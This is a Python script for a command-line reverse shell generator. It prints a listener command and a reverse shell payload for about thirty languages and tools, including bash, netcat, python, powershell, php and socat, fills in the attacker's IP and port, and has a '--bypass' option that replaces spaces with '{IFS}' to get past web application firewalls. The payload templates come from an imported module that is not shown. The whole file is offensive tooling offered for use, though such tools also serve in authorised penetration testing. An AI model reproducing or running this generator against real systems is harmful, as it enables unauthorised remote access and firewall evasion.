from payload import *
import subprocess
import argparse
import ipaddress

class Color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'

def getCommandResult(command):
    p = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, close_fds=True)
    out, _ = p.communicate()

    return str(out.decode('utf-8'))

def getParameter():
    parser = argparse.ArgumentParser()
    parser.add_argument('-ip', type=str, help='External ip address.', default=getCommandResult(GET_IP_ADDRESS[0]))
    parser.add_argument('-p', '--port', type=str, help='Port you want to reverse.', default='4444')
    parser.add_argument('-t', '--type', type=str, default='bash_tcp', help="""Type: awk, bash_tcp, bash_udp, c, dart, golang, groovy, java, lua_linux, lua_windows, ncat, nc, nc_openbsd, nc_busybox, nodejs, openssl, perl, perl_windows, php, powershell, python, python_no_space, python_ipv6, python_ipv6_no_space, python_code, ruby, ruby_windows, socat, telnet. Default: bash_tcp""")
    parser.add_argument('-b', '--bypass', type=int, default='0', help='For bypassing waf.', nargs='?', const=1)
    parser.add_argument('-c1', '--character1', type=str, default=' ', help='Character to replace.', nargs=None)
    parser.add_argument('-c2', '--character2', type=str, default='{IFS}', help='Replace to new character.', nargs=None)
    args = parser.parse_args()
    return vars(args)

def banner():
    f = open('banner.txt', 'r')
    return f.read()

def bypass(bypass_type, payload, bypass_char, bypass_char2):
    if bypass_type:
        payload = payload.replace(bypass_char, bypass_char2)
    else:
        pass
    
    return payload

def getReverseShellPayload(reverse_shell_type, ip, port, bypass_type=None, bypass_char=None, bypass_char2=None):
    reverse_shell = []

    if reverse_shell_type == 'awk':
        reverse_shell = AWK_REVERSE_SHELL
    elif reverse_shell_type == 'bash_tcp':
        reverse_shell = BASH_TCP_REVERSE_SHELL
    elif reverse_shell_type == 'bash_udp':
        reverse_shell = BASH_UDP_REVERSE_SHELL
    elif reverse_shell_type == 'c':
        reverse_shell = C_REVERSE_SHELL
        print('Compile with', Color.GREEN + C_COMPILE[0] + Color.END)
    elif reverse_shell_type == 'dart':
        reverse_shell = DART_REVERSE_SHELL
    elif reverse_shell_type == 'golang':
        reverse_shell = GOLANG_REVERSE_SHELL
    elif reverse_shell_type == 'groovy':
        reverse_shell = GROOVY_REVERSE_SHELL
    elif reverse_shell_type == 'java':
        reverse_shell = JAVA_REVERSE_SHELL
    elif reverse_shell_type == 'lua_linux':
        reverse_shell = LUA_LINUX_REVERSE_SHELL
    elif reverse_shell_type == 'lua_windows':
        reverse_shell = LUA_WINDOWS_REVERSE_SHELL
    elif reverse_shell_type == 'ncat':
        reverse_shell = NCAT_REVERSE_SHELL
    elif reverse_shell_type == 'nc':
        reverse_shell = NETCAT_REVERSE_SHELL
    elif reverse_shell_type == 'nc_openbsd':
        reverse_shell = NETCAT_OPENBSD_REVERSE_SHELL
    elif reverse_shell_type == 'nc_busybox':
        reverse_shell = NETCAT_BUSYBOX_REVERSE_SHELL
    elif reverse_shell_type == 'nodejs':
        reverse_shell = NODE_JS_REVERSE_SHELL
    elif reverse_shell_type == 'openssl':
        reverse_shell = OPENSSL_VICTIM
        print('ATTACKER: ')
        for i in OPENSSL_ATTACKER:
            print(Color.GREEN + i.replace('IP_ADDRESS', ip).replace('PORT', port) + Color.END)
    elif reverse_shell_type == 'perl':
        reverse_shell = PERL_REVERSE_SHELL
    elif reverse_shell_type == 'perl_windows':
        reverse_shell = PERL_WINDOWS_ONLY_REVERSE_SHELL
    elif reverse_shell_type == 'php':
        reverse_shell = PHP_REVERSE_SHELL
    elif reverse_shell_type == 'powershell':
        reverse_shell = POWERSHELL_REVERSE_SHELL
    elif reverse_shell_type == 'python':
        reverse_shell = PYTHON_IPV4_REVERSE_SHELL
    elif reverse_shell_type == 'python_no_space':
        reverse_shell = PYTHON_IPV4_NO_SPACE_REVERSE_SHELL
    elif reverse_shell_type == 'python_ipv6':
        reverse_shell = PYTHON_IPV6_REVERSE_SHELL
        ip = ipaddress.IPv6Address('2002::' + ip).compressed
    elif reverse_shell_type == 'python_ipv6_no_space':
        reverse_shell = PYTHON_IPV6_NO_SPACE_REVERSE_SHELL
        ip = ipaddress.IPv6Address('2002::' + ip).compressed
    elif reverse_shell_type == 'python_code':
        reverse_shell = PYTHON_CODE_REVERSE_SHELL
    elif reverse_shell_type == 'ruby':
        reverse_shell = RUBY_REVERSE_SHELL
    elif reverse_shell_type == 'ruby_windows':
        reverse_shell = RUBY_WINDOWS_ONLY_REVERSE_SHELL
    elif reverse_shell_type == 'socat':
        reverse_shell = SOCAT_REVERSE_SHELL
        print('LISTENER: ')
        for i in SOCAT_LISTENER:
            print(Color.GREEN + i + Color.END)
    elif reverse_shell_type == 'telnet':
        reverse_shell = TELNET_VICTIM
        print('LISTENER: ')
        for i in TELNET_ATTACKER:
            print(Color.GREEN + i + Color.END)
    else:
        print(Color.RED + 'Invalid type')
        exit()
    
    print('=======================================================================================================')
    print('Your payload: ')
    for i in reverse_shell:
        print(Color.BOLD + bypass(bypass_type, i, bypass_char, bypass_char2).replace('IP_ADDRESS', ip).replace('PORT', port) + Color.END)
    print('=======================================================================================================')
    print(Color.RED + "Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash")

def main():
    print()
    print(banner())
    args = getParameter()
    print()
    print('Your listener:' + Color.GREEN, LISTENER[0].replace('PORT', args['port']), Color.END)
    getReverseShellPayload(args['type'], args['ip'], args['port'], args['bypass'], args['character1'], args['character2'])

if __name__ == "__main__":
    main()